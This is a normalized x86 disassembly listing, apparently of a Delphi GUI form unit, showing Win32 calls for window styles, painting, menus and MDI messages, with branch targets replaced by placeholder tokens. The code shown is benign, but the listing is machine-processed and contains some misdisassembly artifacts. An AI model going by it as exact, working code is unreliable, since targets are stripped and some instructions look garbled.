mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_497232
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_44dfac
mov eax [ rw-data ]
mov edx [ eax + 0x84 ]
mov eax [ ebp - 0xc ]
call sub_44de18
mov eax [ ebp - 0x18 ]
movzx eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x18 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4622a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_497239
xor edx edx
mov eax [ ebp - 0xc ]
call sub_44dfac
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b4 ]
xor ecx ecx
call sub_46084c
mov edi eax
test edi edi
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x29f ]
dec edx
sub dl 0x2
jae r-xdata
mov dl 0x1
mov eax edi
call sub_4946a4
mov esi eax
mov eax [ ebp - 0x4 ]
cmp edi [ eax + 0x290 ]
jne r-xdata
mov eax esi
call sub_46d414
mov edi eax
push esi
call GetParent
mov esi eax
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_497e38
call sub_479ce0
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_49737d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_44d060
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_497356
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_497339
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_44dfac
mov eax [ rw-data ]
mov edx [ eax + 0x84 ]
mov eax [ ebp - 0xc ]
call sub_44de18
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_497340
xor edx edx
mov eax [ ebp - 0xc ]
call sub_44dfac
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x29f ]
sub dl 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x29a ] 0x2
je r-xdata
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp edi [ eax + 0x60 ]
je r-xdata
push esi
call SetFocus
jmp r-xdata
call sub_479ce0
mov esi eax
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x299 ]
sub dl 0x2
je r-xdata
sub dl 0x2
jne r-xdata
mov edx eax
or [ edx + 0x18 ] 0x2
cmp esi [ ebp - 0x4 ]
je r-xdata
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub dl 0x3
jne r-xdata
mov eax [ esi + 0x290 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10c ]
jmp r-xdata
cmp edi eax
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x8
call sub_472314
sub_49735d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call ReleaseDC
retn
sub_497428
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x37c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2dc ]
push eax
call CallWindowProcW
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_497474
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_497e6c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_497eb8
cmp [ eax + 0x29a ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_4974b4
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_497685
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x37c ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c0 ]
call sub_44cd7c
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4770b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x37c ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_470990
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_46f238
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x37c ] 0x0
je r-xdata
push ebp
call sub_497428
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x37c ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x37c ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c0 ]
call sub_44cd7c
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_497e6c
test eax eax
je r-xdata
push ebp
call sub_497428
pop ecx
push ebp
call sub_497428
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_497474
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x37c ]
call sub_49405c
jmp r-xdata
sub_497698
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_495410
mov eax [ ebx + 0x37c ]
test eax eax
je r-xdata
test [ ebx + 0x55 ] 0x80
je r-xdata
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x29e ] 0x2
jne r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
push esp
mov eax [ ebx + 0x37c ]
push eax
call GetClientRect
test eax eax
je r-xdata
mov eax ebx
call sub_47078c
mov edx [ ebx + 0x374 ]
sub eax [ edx + 0x18 ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax ebx
call sub_47074c
mov ecx eax
mov eax [ ebx + 0x374 ]
sub ecx [ eax + 0x14 ]
mov esi [ ebx + 0x374 ]
mov edx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
call sub_40ab90
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_49ca24
push 0xffffffff
push 0x0
mov eax [ ebx + 0x37c ]
push eax
call __imp_InvalidateRect
sub_497754
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_495c04
mov eax ebx
call sub_47a060
test al al
je r-xdata
mov eax ebx
call sub_43caf8
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_479ce0
push eax
call GetWindowLongW
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_47593c
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_479ce0
push eax
call SetWindowLongW
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_43cacc
call sub_461684
mov edx esi
mov eax ebx
call sub_43cacc
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
sub_4977ec
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2b0 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2b0 ] 0x1
xor edx edx
push ebp
push sub_497871
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x62 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2b0 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
test eax eax
jne r-xdata
movzx edx [ eax + 0x61 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x80 ]
mov eax [ rw-data ]
movzx edx [ eax + 0x35 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x80 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
sub_49787c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
call sub_46d414
test eax eax
je r-xdata
mov eax [ ebx + 0x354 ]
call sub_408754
mov edi eax
lea eax [ edi + 0x1 ]
push eax
lea eax [ ebx + 0x354 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebx + 0x354 ]
mov edx [ esi + 0x4 ]
mov edx [ edx ]
mov [ eax + edi * 8 ] edx
mov eax [ ebx + 0x354 ]
mov edx [ esi + 0x8 ]
mov [ eax + edi * 8 + 0x4 ] edx
mov eax [ esi + 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_4978e4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_409d28
xor eax eax
push ebp
push sub_497928
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x2bc ]
mov edx [ ebp - 0x4 ]
call sub_409ccc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49792f
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
sub_497934
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
and [ edi ] 0xfff4ffff
and [ ebp ] 0xfffffbff
movzx eax [ esi + 0x299 ]
mov [ esp ] al
cmp [ esi + 0x29e ] 0x1
jne r-xdata
movzx ebx [ esi + 0x298 ]
movzx eax [ esp ]
sub al 0x1
jb r-xdata
movzx eax [ esp ]
test al al
je r-xdata
movzx ebx [ r-xdata ]
jmp r-xdata
sub al 0x2
je r-xdata
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
movzx eax [ esp ]
sub al 0x3
jae r-xdata
movzx eax [ r-xdata ]
and al bl
mov ebx eax
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
test bl 0x1
je r-xdata
cmp [ esi + 0x29e ] 0x1
jne r-xdata
movzx eax [ r-xdata ]
and al bl
mov ebx eax
jmp r-xdata
test bl 0x8
je r-xdata
or [ edi ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or [ ebp ] 0x400
test bl 0x4
je r-xdata
or [ edi ] 0x20000
or [ edi ] 0x10000
sub_4979fd
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff4
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x298 ]
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
movzx eax [ esp ]
mov [ ebx + 0x298 ] al
mov eax ebx
call sub_47a060
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x29e ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_479ce0
push eax
call GetWindowLongW
mov [ esp + 0x4 ] eax
push 0xffffffec
mov eax ebx
call sub_479ce0
push eax
call GetWindowLongW
mov [ esp + 0x8 ] eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax ebx
mov si 0xffaa
call sub_40587c
mov eax [ esp + 0x4 ]
push eax
push 0xfffffff0
mov eax ebx
call sub_479ce0
push eax
call SetWindowLongW
mov eax [ esp + 0x8 ]
push eax
push 0xffffffec
mov eax ebx
call sub_479ce0
push eax
call SetWindowLongW
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_479ce0
push eax
call SetWindowPos
jmp r-xdata
cmp [ ebx + 0x29a ] 0x2
je r-xdata
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax ebx
call sub_4761e4
sub_497ae8
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi eax
and [ edx ] 0x7f3bff7f
and [ edi ] 0xfffffe7e
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffd7ff
movzx eax [ esi + 0x299 ]
cmp [ esi + 0x29e ] 0x1
jne r-xdata
movzx ecx al
cmp ecx 0x5
ja r-xdata
mov ecx eax
test cl cl
je r-xdata
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ ecx * 4 + jump_table_497b36 ]
mov al 0x2
sub cl 0x3
jne r-xdata
pop edi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x29e ] 0x1
je r-xdata
cmp [ esi + 0x34 ] 0x0
jne r-xdata
or [ edx ] 0xc00000
jmp r-xdata
or [ edx ] 0xc40000
jmp r-xdata
test [ esi + 0x1c ] 0x10
je r-xdata
or [ edi ] 0x80
cmp [ esi + 0x1d4 ] 0x0
jne r-xdata
mov ecx [ edx ]
or ecx 0x80000000
or ecx 0xc00000
mov [ edx ] ecx
cmp [ esi + 0x34 ] 0x0
je r-xdata
or [ edx ] 0x80000000
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
or edx 0x8
or edx 0x800
or edx 0x2000
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ edx ]
or ecx __dos_header
or ecx 0x80
mov [ edx ] ecx
or [ edx ] 0xc00000
jmp r-xdata
mov ecx [ edi ]
or ecx 0x1
or ecx 0x100
mov [ edi ] ecx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
jne r-xdata
sub_497bfc
push esi
push edi
add esp 0xfffffff4
mov edi eax
cmp dl [ edi + 0x299 ]
je r-xdata
add esp 0xc
pop edi
pop esi
retn
mov [ edi + 0x299 ] dl
cmp [ edi + 0x274 ] 0x0
je r-xdata
xor edx edx
jmp r-xdata
movzx eax [ edi + 0x299 ]
sub al 0x2
je r-xdata
mov eax edi
call sub_495634
mov eax edi
call sub_47a060
test al al
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
push 0xfffffff0
mov eax edi
call sub_479ce0
push eax
call GetWindowLongW
mov [ esp ] eax
push 0xffffffec
mov eax edi
call sub_479ce0
push eax
call GetWindowLongW
mov [ esp + 0x4 ] eax
push 0xffffffe6
mov eax edi
call sub_479ce0
push eax
call GetClassLongW
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax edi
mov si 0xffa9
call sub_40587c
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax edi
mov si 0xffaa
call sub_40587c
mov eax [ esp ]
push eax
push 0xfffffff0
mov eax edi
call sub_479ce0
push eax
call SetWindowLongW
mov eax [ esp + 0x4 ]
push eax
push 0xffffffec
mov eax edi
call sub_479ce0
push eax
call SetWindowLongW
mov eax [ esp + 0x8 ]
push eax
push 0xffffffe6
mov eax edi
call sub_479ce0
push eax
call SetClassLongW
mov eax edi
call sub_47a060
test al al
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax edi
call sub_479ce0
push eax
call SetWindowPos
mov eax edi
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ edi + 0x34 ] 0x0
je r-xdata
push 0xffffffff
mov eax edi
call sub_479ce0
push eax
call GetSystemMenu
push 0x0
xor ecx ecx
mov edx 0x81
mov eax edi
call sub_472314
cmp [ edi + 0x299 ] 0x3
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax edi
call sub_479ce0
push eax
call __imp_SendMessageW
mov eax edi
call sub_499d68
push eax
push 0x1
push 0x80
mov eax edi
call sub_479ce0
push eax
call SendMessageW
jmp r-xdata
sub_497d9c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x34 ]
mov esi [ ebx + 0x90 ]
mov ecx esp
mov eax ebx
call sub_470508
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0x90 ]
je r-xdata
mov eax ebx
call sub_4761e4
sub_497de0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x90 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_470638
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x60 ]
test al al
je r-xdata
movzx eax [ ebx + 0x299 ]
mov [ ebx + 0x2e4 ] al
mov [ ebx + 0x299 ] 0x0
movzx eax [ ebx + 0x2e4 ]
mov [ ebx + 0x299 ] al
jmp r-xdata
sub_497e38
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x29e ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x37c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x37c ]
push eax
call __imp_SendMessageW
call sub_46d414
sub_497e6c
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x29e ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x37c ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_49d570
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_49d55c
cmp [ eax + 0x29e ] 0x1
jne r-xdata
sub_497eb8
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x29e ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x37c ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_49d570
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_49d55c
cmp [ eax + 0x29e ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_497f08
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_4303e0
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_497f38
push ebx
push esi
push edi
push ebp
mov ebx eax
xor ebp ebp
push 0x2
mov eax ebx
call sub_479ce0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ rw-data ]
call sub_49d540
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_49e7e8
mov eax [ rw-data ]
call sub_49d540
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_49d52c
mov ebp eax
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_49d52c
mov ebp eax
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_49d52c
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_49d52c
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_497ff4
push ebx
mov ebx eax
mov eax ebx
call sub_497fec
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x2ac ]
call sub_452f10
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_49801c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x29e ]
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
cmp bl 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x3
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x29e ] bl
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
setne al
xor al 0x1
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29f ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_47a060
test al al
je r-xdata
xor edx edx
push ebp
push sub_498184
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_47ba3c
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_498514
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29e ] 0x3
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_479ce0
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x29e ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x29e ] bl
cmp bl 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e9 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_498648
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_470fdc
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4763e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_496cd0
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_47ba3c
sub_498190
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x29e ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x37c ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x2b4 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x2c0 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x38 ]
mov esi eax
mov eax ebp
call sub_479ce0
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x37c ]
push eax
call __imp_SendMessageW
test bl bl
je r-xdata
call sub_45c284
mov edi eax
mov eax ebp
call sub_479ce0
push eax
call DrawMenuBar
sub_49820c
push ebx
mov ebx edx
mov [ eax + 0x2c8 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_43c22c
xor edx edx
mov eax ebx
call sub_45ef08
sub_498230
push ebx
mov ebx eax
cmp edx [ ebx + 0x2c0 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x2c0 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_498190
mov eax edx
mov edx ebx
call sub_43c22c
sub_498258
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_49846c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x2b4 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_49d570
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_4611c4
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_49d55c
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_43c22c
mov [ ebx + 0x2b4 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_49d55c
cmp esi [ eax + 0x2b4 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
mov eax ebx
call sub_47a060
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x29d ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_479ce0
push eax
call SetMenu
mov eax [ ebx + 0x2b4 ]
cmp [ eax + 0x64 ] 0x0
jne r-xdata
cmp [ ebx + 0x299 ] 0x3
je r-xdata
mov eax ebx
call sub_498190
cmp [ ebx + 0x2bc ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
